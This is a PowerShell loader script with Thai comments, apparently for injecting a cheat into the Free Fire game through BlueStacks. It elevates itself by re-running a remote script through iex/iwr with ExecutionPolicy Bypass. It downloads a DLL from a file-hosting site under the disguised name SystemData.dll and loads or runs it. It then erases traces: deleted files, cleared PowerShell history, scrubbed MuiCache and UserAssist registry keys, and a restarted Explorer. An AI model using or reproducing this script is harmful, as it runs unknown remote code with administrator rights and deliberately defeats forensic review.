# 1. ตรวจสอบสิทธิ์ Administrator
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าไฟล์
$url = "https://files.catbox.moe/0ukxya.dll"
$fileName = "SystemData.dll" 
$workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
$dllPath = Join-Path $workDir $fileName
$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"

# 3. เตรียมโฟลเดอร์ทำงาน
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 4. ดาวน์โหลด DLL
try {
    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
} catch {
    exit
}

# 5. สั่งรัน (ใช้วิธีโหลดเข้า Memory เพื่อแก้ปัญหา Missing Entry)
if (Test-Path $dllPath) {
    try {
        # วิธีที่ 1: โหลด DLL เข้าสู่ Process ปัจจุบันโดยตรง (ไม่ต้องใช้ Entry Point)
        [Reflection.Assembly]::LoadFile($dllPath) | Out-Null
        
        # เมื่อโหลด DLL เสร็จแล้ว ให้สั่งรัน BlueStacks ทันที
        if (Test-Path $blueStacksPath) {
            Start-Process -FilePath $blueStacksPath
        }
    } catch {
        # วิธีที่ 2: ถ้าวิธีแรกติดขัด ให้ใช้ rundll32 แบบไม่มีชื่อฟังก์ชัน (เผื่อ DLL รันตัวเองที่ DllMain)
        Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$dllPath`"" -WorkingDirectory $workDir
        if (Test-Path $blueStacksPath) { Start-Process -FilePath $blueStacksPath }
    }
}

# รอให้โปรแกรมเริ่มทำงานสักครู่ก่อนลบ
Start-Sleep -Seconds 3

# 6. --- เริ่มกระบวนการลบร่องรอย (Deep Clean) ---
# ลบไฟล์ทิ้งทันที
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

# ล้างประวัติ PowerShell
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
Clear-History

# ล้าง MuiCache (Registry ประวัติชื่อไฟล์)
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fileName*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
}

# ล้าง UserAssist (ประวัติการเปิดโปรแกรม)
$uaPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
Get-ChildItem -Path $uaPath -ErrorAction SilentlyContinue | Get-ChildItem | Get-ChildItem | Where-Object { $_.Name -like "*$fileName*" } | Remove-Item -Force -ErrorAction SilentlyContinue

# รีสตาร์ท Explorer เพื่อล้าง Cache ใน RAM (ทำให้ LastActivityView หาไม่เจอ)
Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue
Start-Process Explorer
